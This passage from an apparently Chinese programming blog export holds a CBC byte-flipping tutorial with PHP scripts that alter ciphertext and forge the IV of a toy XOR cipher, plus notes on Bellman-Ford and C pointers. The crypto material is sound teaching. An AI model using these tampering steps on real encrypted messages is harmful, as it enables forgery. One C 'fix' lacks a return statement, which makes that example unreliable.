class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">5 7</span></span><br><span class="line"><span class="comment">1 2 5</span></span><br><span class="line"><span class="comment">1 3 5</span></span><br><span class="line"><span class="comment">2 5 -1</span></span><br><span class="line"><span class="comment">2 3 -2</span></span><br><span class="line"><span class="comment">3 4 3</span></span><br><span class="line"><span class="comment">3 5 -2</span></span><br><span class="line"><span class="comment">4 5 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5 7</span></span><br><span class="line"><span class="comment">1 2 1</span></span><br><span class="line"><span class="comment">2 4 2</span></span><br><span class="line"><span class="comment">5 4 3</span></span><br><span class="line"><span class="comment">3 4 4</span></span><br><span class="line"><span class="comment">1 3 5</span></span><br><span class="line"><span class="comment">1 5 6</span></span><br><span class="line"><span class="comment">2 5 7</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>这部分的代码尤为重要：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> ok = <span class="literal">true</span>;  <span class="comment">//判断是否含有负权回路</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)</span><br><span class="line">    <span class="keyword">if</span> (minD[edges[i].v] &gt; minD[edges[i].u] + edges[i].w) &#123;</span><br><span class="line">        ok = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果存在从源点可达的权为负的回路，那么我就可以不断地通过使用这一条回路将路径长度缩小，即最小路径和不收敛，哪来的最短路？</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>最短路</tag>
      </tags>
  </entry>
  <entry>
    <title>CBC字节翻转攻击</title>
    <url>/2022/07/10/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>上文我们初步了解了<code>CBC</code>加密原理以及模拟实现，但是根据原理，我们可以控制第一段密文来控制第二段明文的形成，这就是所谓的<code>CBC</code>字节翻转攻击。当然实现该攻击是要具备一定条件的，例如我们需要获取到<code>iv</code>向量，密文段，以及修改后的第一段错误明文。</p>
<p>举个例子，阿强爱上了阿珍，他将信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">i love you</span><br></pre></td></tr></table></figure>

<p>通过编码后，将<code>iv</code>和密文<code>cipher</code>发送给阿珍，但是在传输过程中被隔壁老王截取到了，老王心想能拆散一对是一对，将把信息篡改成：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">i hate you</span><br></pre></td></tr></table></figure>

<p>成功将他们的爱情扼杀在摇篮中！🤡</p>
<a id="more"></a>

<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>让我们先回顾一下解密流程：<br><img src="https://cdn.yalexin.top/image-20220709185258788.png" alt></p>
<p>字节翻转攻击的利用点是利用上一段密文来控制本段明文的生成，这是因为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plain[2] = decrypt(cipher[2]) ⊕ cipher[1]</span><br></pre></td></tr></table></figure>

<p>由于我们的数据是分段的，即有：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i from 1 to 16:</span><br><span class="line">	plain[2][i] = decrypt(cipher[2][i]) ⊕ cipher[1][i]</span><br></pre></td></tr></table></figure>

<p>如果我们希望<code>plain[2][i]</code>是某一个特定的字符，如<code>&#39;a&#39;</code>，那么我们可以从<code>cipher[1][i]</code>入手，为了达成该目的，我们先来看推导过程：</p>
<p>假设我们希望<code>plain[2][1]</code>将来解密以后是<code>&#39;a&#39;</code>，设改变后的<code>cipher[1][1]</code>的值为<code>x</code>，则有：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">'a' = decrypt(cipher[2][1]) ⊕ x</span><br><span class="line">'a' ⊕ x = decrypt(cipher[2][1]) = y</span><br><span class="line">而未改变之前</span><br><span class="line">Plain[2][1] = decrypt(cipher[2][1]) ⊕ cipher[1][1]</span><br><span class="line">即</span><br><span class="line">Plain[2][1] ⊕ cipher[1][1] = decrypt(cipher[2][1]) = y</span><br><span class="line">注意到，我们第二段密文我们并没有改变，即第 2 行的 y 和 第 6 行的 y 是一致的，将第 2 行和第 6 行合并，有</span><br><span class="line">'a' ⊕ x = Plain[2][1] ⊕ cipher[1][1]</span><br><span class="line">即</span><br><span class="line">x = Plain[2][1] ⊕ cipher[1][1] ⊕ 'a'</span><br><span class="line">上述的 cipher[1][1] 指的是最初的</span><br></pre></td></tr></table></figure>

<h3 id="修复iv"><a href="#修复iv" class="headerlink" title="修复iv"></a>修复<code>iv</code></h3><p>由于我们修改了密文的第一段，因此经过解码后，再和原始的<code>iv</code>进行异或，那么得到的明文就不再是原来的第一段明文了，因此我们要修改<code>iv</code>，使得其生成最终生成的第一段明文和原来的一致（当然，要是你想第一段也修改，那就另当别论）。</p>
<p>老规矩，先上推导过程：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">依题意</span><br><span class="line">plain_erro = iv_old ⊕ decrypt(cipher[1]_new)</span><br><span class="line">即</span><br><span class="line">plain_erro ⊕ iv_old = decrypt(cipher[1]_new)</span><br><span class="line">令</span><br><span class="line">iv_new ⊕ decrypt(cipher[1]_new) = plain</span><br><span class="line">上式子中 plain 是原来的明文，式子可以进一步变形，即</span><br><span class="line">iv_new = plain ⊕ decrypt(cipher[1]_new)</span><br><span class="line">将第 4 行和第 8 行合并，有</span><br><span class="line">iv_new = plain ⊕ plain_erro ⊕ iv_old</span><br></pre></td></tr></table></figure>

<p>由此可见，为了使得第一段明文能够被解密方解密，我们需要获得我们修改第一段密文后，得到的错误明文段。</p>
<h2 id="模拟复现"><a href="#模拟复现" class="headerlink" title="模拟复现"></a>模拟复现</h2><p>CBC加密复现基本上和上文的一样，只不过为了使得加密后的字符串可见，这里加了<code>base64</code>编码。而且为了方便演示，这里将加密和解密分开到两个脚本中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// cbc_encode.php</span></span><br><span class="line"><span class="comment">// 密钥</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="number">23</span>);</span><br><span class="line"><span class="comment">// 产生长度为 16字节 的随机 iv 向量，一个字符在计算机内部使用8比特表示，即一个字节</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_init_vector</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$random_iv = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; <span class="number">16</span>;$i++) &#123;</span><br><span class="line">        $random_iv .= chr(rand(<span class="number">1</span>, <span class="number">128</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密运算</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$tmp = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 和密钥异或</span></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; strlen($data);$i++) &#123;</span><br><span class="line">        $tmp .= chr(ord($data[$i]) ^ SECRET_KEY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC 加密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cbc_encode</span><span class="params">($plain, $len)</span></span>&#123;</span><br><span class="line">	$iv = get_random_init_vector();</span><br><span class="line">	<span class="comment">// 分段</span></span><br><span class="line">	$plain_tmp = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		$plain_tmp[$i] = substr($plain, $i * <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$cipher = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 对于每一段明文都要进行加密</span></span><br><span class="line">	$last_cipher = $iv;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		<span class="comment">// 上一段密文先和本明文做异或运算</span></span><br><span class="line">		$str_tmp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">16</span>; $j++)&#123;</span><br><span class="line">			$str_tmp .= chr(ord($last_cipher[$j]) ^ ord($plain_tmp[$i][$j]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 再进行加密</span></span><br><span class="line">		$cipher_i = encode($str_tmp);</span><br><span class="line">		$cipher .= $cipher_i;</span><br><span class="line">		$last_cipher = $cipher_i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'iv'</span> =&gt; base64_encode($iv),</span><br><span class="line">		<span class="string">'cipher'</span> =&gt; base64_encode($cipher)</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// $mydata = "I               love             you.............";</span></span><br><span class="line">$mydata = $argv[<span class="number">1</span>];</span><br><span class="line">$info = cbc_encode($mydata, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"数据是：\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $mydata . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"加密后："</span> . <span class="string">"\n"</span>;</span><br><span class="line">var_dump($info);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// cbc_decode.php</span></span><br><span class="line"><span class="comment">// 密钥</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密运算</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$tmp = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 和密钥异或</span></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; strlen($data);$i++) &#123;</span><br><span class="line">        $tmp .= chr(ord($data[$i]) ^ SECRET_KEY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC 解密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cbc_decode</span><span class="params">($cipher, $iv, $len)</span></span>&#123;</span><br><span class="line">	$cipher = base64_decode($cipher);</span><br><span class="line">	$iv     = base64_decode($iv);</span><br><span class="line">	<span class="comment">// 分段</span></span><br><span class="line">	$cipher_tmp = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		$cipher_tmp[$i] = substr($cipher, $i * <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$plain = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 对于每一段密文都要进行解密</span></span><br><span class="line">	$last_cipher = $iv;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		<span class="comment">// 先进行解密</span></span><br><span class="line">		$plain_i_tmp = decode($cipher_tmp[$i]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 再和上一段密文做异或运算</span></span><br><span class="line">		$str_tmp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">16</span>; $j++)&#123;</span><br><span class="line">			$str_tmp .= chr(ord($last_cipher[$j]) ^ ord($plain_i_tmp[$j]));</span><br><span class="line">		&#125;</span><br><span class="line">		$plain .= $str_tmp;</span><br><span class="line">		$last_cipher = $cipher_tmp[$i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (substr($plain, <span class="number">0</span>, <span class="number">16</span>) !== <span class="string">"I               "</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"消息被篡改！"</span> . base64_encode($plain) . <span class="string">"是错误的！"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'plain'</span> =&gt; $plain</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = <span class="keyword">array</span>();</span><br><span class="line">$info[<span class="string">'iv'</span>] = $argv[<span class="number">1</span>];</span><br><span class="line">$info[<span class="string">'cipher'</span>] = $argv[<span class="number">2</span>];</span><br><span class="line">$data = cbc_decode($info[<span class="string">'cipher'</span>], $info[<span class="string">'iv'</span>], <span class="number">3</span>);</span><br><span class="line">var_dump($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>阿强给阿珍发了加密信息：</p>
<p><img src="https://cdn.yalexin.top/image-20220711211953054.png" alt="image-20220711211953054"></p>
<p>如果阿珍能够正常接受，解密后：</p>
<p><img src="https://cdn.yalexin.top/image-20220711212222566.png" alt="image-20220711212222566"></p>
<p>下面进行攻击模拟：</p>
<p>假设隔壁老王获悉了原始的明文、初始向量和密文</p>
<p>老王想把消息的第二段改为<code>hate</code>，他略加思考，写下了下面的篡改脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// hack_data.php</span></span><br><span class="line">$origin_iv = base64_decode(<span class="string">"bFQYFlR5BVdfHChTUGspWA=="</span>);</span><br><span class="line">$origin_cipher = base64_decode(<span class="string">"MmMvIWNOMmBoKx9kZ1web0kbTlNUeQVXXxwoU1BrKVh+dTYxbUA8bmYlEWppUhBh"</span>);</span><br><span class="line">$hack_msg = <span class="string">"hate            "</span>;</span><br><span class="line">$plain = <span class="string">"I               love             you............."</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</span><br><span class="line">	<span class="comment">// x = Plain[2][1] ⊕ cipher[1][1] ⊕ 'a'</span></span><br><span class="line">	$origin_cipher[$i] = chr(ord($plain[$i + <span class="number">16</span>])  ^ ord($origin_cipher[$i]) ^ ord($hack_msg[$i]));</span><br><span class="line">&#125;</span><br><span class="line">$new_cipher = base64_encode($origin_cipher);</span><br><span class="line"><span class="keyword">echo</span> $new_cipher;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>他将信息篡改好，然后发给阿珍，阿珍解析出来后，暗号对不上（第一段明文不是<code>I</code>），并将错误信息发出来：</p>
<p><img src="https://cdn.yalexin.top/image-20220711144007390.png" alt="image-20220711144007390"></p>
<p>可以看得到，老王成功地将第二段明文修改好了，下一步就是将<code>iv</code>修改好。</p>
<p>老外略加思索，立刻写出来恢复<code>iv</code>的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// hack_iv.php</span></span><br><span class="line">$origin_iv = base64_decode(<span class="string">"bFQYFlR5BVdfHChTUGspWA=="</span>);</span><br><span class="line">$plain = <span class="string">"I               love             you............."</span>;</span><br><span class="line">$plain_erro = base64_decode(<span class="string">"TS4iICAgICAgICAgICAgIGhhdGUgICAgICAgICAgICAgeW91Li4uLi4uLi4uLi4u"</span>);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</span><br><span class="line">	<span class="comment">// iv_new = plain ⊕ plain_erro ⊕ iv_old</span></span><br><span class="line">	$origin_iv[$i] = chr(ord($plain[$i]) ^ ord($plain_erro[$i]) ^ ord($origin_iv[$i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($origin_iv);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.yalexin.top/image-20220711224840348.png" alt="image-20220711224840348"></p>
<p>阿珍立即收到错误的消息，老王成功棒打鸳鸯！🙃</p>
<hr>
<p>从这个例子中，我们学会了喜欢一个人的时候，要大胆地面对面说出来，不要整这些花里胡哨的的暗示。😁</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>CBC</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言的指针</title>
    <url>/2020/06/29/C%E8%AF%AD%E8%A8%80%E7%9A%84%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<h2 id="指针作为参数传递"><a href="#指针作为参数传递" class="headerlink" title="指针作为参数传递"></a>指针作为参数传递</h2><p>C语言中，当指针作为函数参数进行传递时，实际上形参和实参指向的是同一个地方，例如：<a id="more"></a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-06-19 18:02:53</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-06-29 08:59:40</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\some_test\pointTest-copy.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> *p1)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"=== test p1 = %p ====\n"</span>, p1); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"=== main p = %p ====\n"</span>, p);</span><br><span class="line">    test(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出的是：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">=== main p = <span class="number">0000000000000010</span> ====</span><br><span class="line">=== test p1 = <span class="number">0000000000000010</span> ====</span><br></pre></td></tr></table></figure>

<p>可见二者的地址是相同的。</p>
<p>所以形参对其指向的内存区域进行修改，也会影响到实参指向的内存区域，因为二者指向的区域是同一个位置，例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-06-19 18:02:53</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-06-29 09:08:30</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\some_test\pointTest-copy.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> *p1)</span> </span>&#123; *p1 = <span class="number">2</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> *p = &amp;a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"before a = %d\n"</span>, a);</span><br><span class="line">    test(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after a = %d\n"</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出的是：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">before a = <span class="number">1</span></span><br><span class="line">after a = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>但是，我们再来看一个例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-06-19 18:02:53</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-06-29 09:16:55</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\some_test\pointTest-copy.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> *p1)</span> </span>&#123; p1 = <span class="string">"modified"</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    test(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after p = %s\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很容易让人以为输出的是</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">after p = modified</span><br></pre></td></tr></table></figure>

<p>但是实际上输出的是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">after p = (null)</span><br></pre></td></tr></table></figure>

<p>下图给出这个过程中，指针的变化：</p>
<p><img src="https://q.yalexin.top/1.png" alt="1"></p>
<p>实际上是因为形参指向的区域已经与实参指向的不一致。</p>
<p>但是假如有在被调函数改变实参的地址的需求怎么办？</p>
<p>两种方法：</p>
<ol>
<li><p>被调函数返回指针：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">(<span class="keyword">char</span> *p1)</span> </span>&#123; p1 = <span class="string">"modified"</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    p = test(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after p = %s\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是使用该方法的时候，不推荐返回局部指针，返回局部指针很容易出现错误，详见<a href="https://www.cnblogs.com/qinguoyi/p/10154804.html" target="_blank" rel="noopener">这篇文章</a></p>
<p>下面的例子就是存在问题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">(<span class="keyword">char</span> *p1)</span> </span>&#123;</span><br><span class="line">    p1 = <span class="string">"modified"</span>;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>] = <span class="string">""</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(str, <span class="string">"yalexin %s"</span>, p1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"str = %s\n"</span>,str);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    p = test(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after p = %s\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出的是：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">str = yalexin modified</span><br><span class="line">after p = (null)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用二级指针：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> **p1)</span> </span>&#123; *p1 = <span class="string">"modified"</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"调用函数之前p的地址是 %p\n"</span>, p);</span><br><span class="line">    test(&amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"调用函数之后p的地址是 %p\n"</span>, p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after p = %s\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">调用函数之前p的地址是 <span class="number">0000000000000000</span></span><br><span class="line">调用函数之后p的地址是 <span class="number">0000000000404000</span></span><br><span class="line">after p = modified</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li>当指针指向的是一个变量，例如<code>*int* *p = &amp;a;</code>，是不能使用<code>free(p)</code>进行释放资源， <code>free()</code> 只是针对使用了 <code>malloc()</code>， <code>realloc()</code>函数进行申请的内存进行释放。 </li>
<li>使用<code>free()</code>后，相应的指针就会变为“野指针”，如果对野指针进行引用，会造成不可预期的后果，所以一般使用<code>free(p)</code>后，一般紧接着<code>p = NULL</code></li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS 语法二</title>
    <url>/2020/03/08/CSS-%E8%AF%AD%E6%B3%95%E4%BA%8C/</url>
